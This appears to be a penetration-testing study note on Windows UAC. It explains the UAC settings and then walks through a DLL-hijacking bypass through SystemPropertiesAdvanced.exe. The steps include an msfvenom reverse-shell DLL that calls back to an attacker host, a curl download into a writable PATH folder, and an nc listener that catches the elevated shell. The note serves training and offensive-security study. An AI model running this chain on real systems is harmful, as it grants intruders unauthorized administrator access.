## What is UAC?
- Enables a **consent prompt** for elevated activities — apps run under a non-admin security context by default unless explicitly elevated.
- **Not considered a security boundary** — it's a convenience feature protecting admins from unintended changes, but it can be bypassed.
- When UAC is enabled, admin accounts get **two separate tokens** at logon: a standard user token (used by default) and an elevated admin token (used only when explicitly approved).
- The **built-in RID 500 Administrator** always runs at the **high mandatory level** regardless of UAC.

## Key UAC Group Policy Settings

| Setting | Registry Key | Default |
|---|---|---|
| Admin Approval Mode for built-in Admin | `FilterAdministratorToken` | Disabled |
| Behavior of elevation prompt (admins) | `ConsentPromptBehaviorAdmin` | Prompt for consent (non-Windows binaries) |
| Behavior of elevation prompt (standard users) | `ConsentPromptBehaviorUser` | Prompt for credentials on secure desktop |
| Run all administrators in Admin Approval Mode | `EnableLUA` | Enabled |
| Switch to secure desktop when prompting | `PromptOnSecureDesktop` | Enabled |



**`ConsentPromptBehaviorAdmin` values:**
- `0x0` = Elevate without prompting
- `0x1` = Prompt for credentials on secure desktop
- `0x2` = Prompt for consent on secure desktop
- `0x5` = **Always notify** (highest UAC level — fewest bypasses)

---

## Situational Awareness

### Check if UAC is enabled
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# 0x1 = enabled
```

### Check UAC level
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0x5 = Always notify (highest)
```

### Check current user context
```cmd
whoami /user
whoami /priv
net localgroup administrators
```
Example: user `sarah` is in the Administrators group, but `whoami /priv` only shows **standard user privileges** — UAC is holding back the elevated token.

### Check Windows build (for bypass selection)
```powershell
[environment]::OSVersion.Version
# Build 14393 = Windows 10 Release 1607
```
Cross-reference against the [UACME](https://github.com/hfiref0x/UACME) project to find applicable bypasses for the target build.

---

## UAC Bypass — DLL Hijacking via SystemPropertiesAdvanced.exe

**UACME Technique #54** — works on Windows 10 build 14393+.

### Root Cause
- The **32-bit** `SystemPropertiesAdvanced.exe` (in `SysWOW64`) **auto-elevates** without a UAC prompt.
- It attempts to load `srrstr.dll` (used by System Restore) which **doesn't exist by default**.
- Windows DLL search order means it checks directories in `%PATH%` — which includes `C:\Users\<user>\AppData\Local\Microsoft\WindowsApps` (user-writable).
- Plant a malicious `srrstr.dll` there → auto-elevated process loads it → code executes with **elevated token**.

### Windows DLL Search Order
1. Directory from which the application loaded
2. `C:\Windows\System32` (64-bit)
3. `C:\Windows\System` (16-bit, not supported on 64-bit)
4. `C:\Windows`
5. Directories listed in `%PATH%` (left to right)

### Verify the PATH includes a writable user directory
```powershell
cmd /c echo %PATH%
```
```
C:\Windows\system32;
C:\Windows;
...
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;   ← writable
```

---

## Exploitation Walkthrough

### Step 1 — Generate malicious DLL (x86)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
> Must be 32-bit (`x86`) — `SysWOW64\SystemPropertiesAdvanced.exe` is a 32-bit process.

### Step 2 — Host it
```bash
sudo python3 -m http.server 8080
```

### Step 3 — Download to user-writable PATH location on target
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Step 4 — Start listener
```bash
nc -lvnp 8443
```

### Step 5 — Test DLL execution (standard context)
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
- Shell fires back but **only shows standard user privileges** — confirms DLL works, but UAC still in effect here.

### Step 6 — Kill lingering rundll32 processes
```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

### Step 7 — Trigger auto-elevation via SysWOW64 binary
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
- Auto-elevates without UAC prompt → loads malicious `srrstr.dll` from PATH → fires reverse shell with **elevated token**.

### Step 8 — Catch the elevated shell
```bash
nc -lvnp 8443
```
```
whoami /priv
# Full admin privilege set now present (SeImpersonatePrivilege Enabled, SeDebugPrivilege, SeBackupPrivilege, etc.)
```

---

## Key Takeaway
UAC is **not a security boundary** — it's a speed bump. The bypass chain here is:
1. Identify a user-writable directory in `%PATH%`.
2. Find an **auto-elevating** 32-bit binary that loads a non-existent DLL.
3. Drop a malicious DLL at the writable PATH location.
4. Trigger the auto-elevating binary → UAC bypassed → elevated shell.

Reference the **UACME** project for a maintained list of bypass techniques mapped to specific Windows build numbers.